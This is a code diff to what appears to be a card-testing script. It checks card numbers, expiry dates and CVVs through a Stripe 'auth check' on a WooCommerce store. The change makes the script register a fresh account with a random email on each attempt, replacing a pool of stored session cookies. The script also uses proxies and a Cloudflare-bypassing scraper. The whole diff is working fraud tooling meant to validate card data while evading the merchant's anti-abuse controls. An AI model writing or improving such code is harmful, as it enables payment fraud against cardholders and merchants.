@@ -116,11 +116,59 @@ def _get_bin_info(bin6):
     return fallback
 
 
+def _generate_email(length=10):
+    chars = string.ascii_lowercase + string.digits
+    return ''.join(random.choice(chars) for _ in range(length)) + "@gmail.com"
+
+
+def _auto_register(scraper):
+    """Auto-register a fresh account on the site and navigate to add-payment-method."""
+    try:
+        r_page = scraper.get(ACCOUNT_URL, timeout=20)
+        if r_page.status_code != 200:
+            return None, f"Site HTTP {r_page.status_code}"
+
+        reg_match = re.search(r'id="woocommerce-register-nonce".*?value="(.*?)"', r_page.text)
+        if not reg_match:
+            return None, "Register nonce not found"
+
+        email = _generate_email()
+        reg_data = {
+            'email': email,
+            'email_2': '',
+            'wc_order_attribution_source_type': 'typein',
+            'wc_order_attribution_referrer': '(none)',
+            'wc_order_attribution_utm_campaign': '(none)',
+            'wc_order_attribution_utm_source': '(direct)',
+            'wc_order_attribution_utm_medium': '(none)',
+            'wc_order_attribution_utm_content': '(none)',
+            'wc_order_attribution_utm_id': '(none)',
+            'wc_order_attribution_utm_term': '(none)',
+            'wc_order_attribution_utm_source_platform': '(none)',
+            'wc_order_attribution_utm_creative_format': '(none)',
+            'wc_order_attribution_utm_marketing_tactic': '(none)',
+            'wc_order_attribution_session_entry': APM_URL,
+            'wc_order_attribution_session_start_time': time.strftime('%Y-%m-%d %H:%M:%S'),
+            'wc_order_attribution_session_pages': '1',
+            'wc_order_attribution_session_count': '1',
+            'wc_order_attribution_user_agent': ULTRA_HEADERS['user-agent'],
+            'woocommerce-register-nonce': reg_match.group(1),
+            '_wp_http_referer': '/my-account/add-payment-method/',
+            'register': 'Register',
+        }
+
+        scraper.post(ACCOUNT_URL, params={'action': 'register'}, data=reg_data, timeout=20)
+        scraper.get(PAYMENT_URL, timeout=15)
+        r_apm = scraper.get(APM_URL, timeout=15)
+        return r_apm, None
+    except Exception as e:
+        return None, str(e)[:80]
+
+
 def _process_card(cc, mm, yy, cvv, proxy_dict=None):
-    """Stripe auth check using pre-authenticated account pool."""
+    """Stripe auth check — auto-registers fresh account each time."""
     try:
         yy_full = f"20{yy[-2:]}" if len(yy) <= 2 else yy
-        acc = random.choice(ACCOUNT_POOL)
 
         if cloudscraper:
             scraper = cloudscraper.create_scraper(
@@ -129,19 +177,22 @@ def _process_card(cc, mm, yy, cvv, proxy_dict=None):
         else:
             scraper = requests.Session()
 
-        # Proxy only for site requests, NOT for Stripe API
         if proxy_dict:
             scraper.proxies.update(proxy_dict)
 
-        scraper.cookies.update(acc['cookies'])
         scraper.headers.update(ULTRA_HEADERS)
 
-        # Step 1: Load add-payment-method page
+        # Step 1: Auto-register and load add-payment-method page
         try:
-            r_page = scraper.get(APM_URL, timeout=20)
+            r_page, reg_err = _auto_register(scraper)
         except (requests.exceptions.ConnectionError, requests.exceptions.Timeout,
                 requests.exceptions.ProxyError, ConnectionError, OSError) as e:
             return {"status": "ConnError", "response": str(e)[:80]}
+
+        if not r_page:
+            if reg_err and any(k in reg_err for k in ["Max retries", "Timeout", "Connection"]):
+                return {"status": "ConnError", "response": reg_err}
+            return {"status": "Error", "response": reg_err or "Registration failed"}
 
         if r_page.status_code == 429:
             return {"status": "ConnError", "response": "Rate limited (429)"}
